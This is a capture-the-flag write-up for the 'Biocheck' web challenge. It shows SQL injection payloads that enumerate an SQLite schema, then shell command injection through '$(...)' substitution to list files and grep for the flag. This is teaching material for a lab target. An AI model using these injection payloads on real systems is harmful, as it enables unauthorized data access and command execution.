# Biocheck

## Description

Biocheck [Web]

ARIA has started making simple applications to display their intelligence, but they're still in a rough state. Break in, and discover the critical information!

[https://uscybercombine-s4-biocheck.chals.io/](https://uscybercombine-s4-biocheck.chals.io/)

## Solution

We can query information about Historical figures, but we are limited to few people

![Bio Check](/assets/ctf/uscybergames/bio_check.png)

If we inject quote (`'`) we get 500 error, meaning there's probably SQL query used
![Bio Check-1](/assets/ctf/uscybergames/bio_check-1.png)

Check if SQLite3: `Albert Einstein' UNION SELECT sqlite_version(); -- -`
![Bio Check-2](/assets/ctf/uscybergames/bio_check-2.png)

[PayloadsAllTheThings/SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version)

```sql
' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%
> figures

' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='figures
> CREATE TABLE figures (
	id INTEGER PRIMARY KEY,
	name TEXT NOT NULL,
	bio TEXT NOT NULL
)
```

The database only holds figure records and that's it. 

I was testing for SSTI since it's a Python server, but was going nowhere. Then I tried 
::: raw `${{7*7}}` ::: 
and the app crashed (added dollar), why? I think the only programming language that treats dollars as special characters is PHP or Bash, we are on Python server so that leaves Bash. Trying `$0` shell variable we get runner program name:
![Bio Check-3](/assets/ctf/uscybergames/bio_check-3.png)

Payload: `'; SELECT '$(ls)'; -- -`
![Bio Check-4](/assets/ctf/uscybergames/bio_check-4.png)

Payload: `' UNION SELECT '$(grep "SIVBGR" . -Rain)' -- -`

![Bio Check-5](/assets/ctf/uscybergames/bio_check-5.png)
::: tip Flag
`**SIVBGR{H1st0ry_1s_1mp0rt4nt!}**`
:::

